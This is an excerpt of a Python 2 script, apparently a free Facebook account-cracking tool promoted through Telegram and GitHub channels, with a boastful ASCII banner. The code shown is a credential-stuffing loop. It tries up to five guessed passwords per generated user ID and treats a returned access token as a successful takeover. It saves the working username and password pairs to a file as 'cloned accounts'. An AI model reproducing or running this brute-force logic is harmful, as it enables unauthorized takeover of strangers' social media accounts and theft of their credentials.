# MY TELEGRAM CHANNEL @Kochwal
# MY TELEGRAM GROUP @Cyberyking
#MY GITHUB https://github.com/Alicybery420
#THIS SCRIPT FREE 
...
Mking_youtube = random.choice(["https://youtube.com/channel/"])
...
#Mking Logo
logo ="""
\033[1;91m     Ali Cybery \033[1;0m
\033[1;91m     Iam Wonded Lion \033[1;0m
\033[1;97m    That he milks his wonds       \033[1;0m
\033[1;97m     Woe to the day of revenge     \033[1;0m
\033[1;91m     I make everyone a cave     \033[1;0m
\033[1;91m             \033[1;0m
\033[1;97m            \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : Ali Cybery
\033[1;91m GitHub      : https://github.com/Alicybery420
\033[1;91m YouTube     : Nadarm
\033[1;91m Telegram CH   : @Andertacker 
\033[1;91m TLEGRAM GP    : https://t.me/Cyberyking
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY ALI CYBERY'
        print '\x1b[1;92m THISE SCRIPT CREATED BY ALI CYBERY '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[Alicybery_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Alicybery.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[Alicybery_CP] ' + k + c + user + ' | ' + pass1
                cps = open('Alicybery.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[Alicybery_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Alicybery.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[Alicybery_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Alicybery.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[Alicybery_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Alicybery.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[Alicybery_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Alicybery.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[Alicybery_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Alicybery.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[Alicybery_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Alicybery.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[Alicybery_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Alicybery.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[Alicybery_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Alicybery.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : Alicybery.txt'
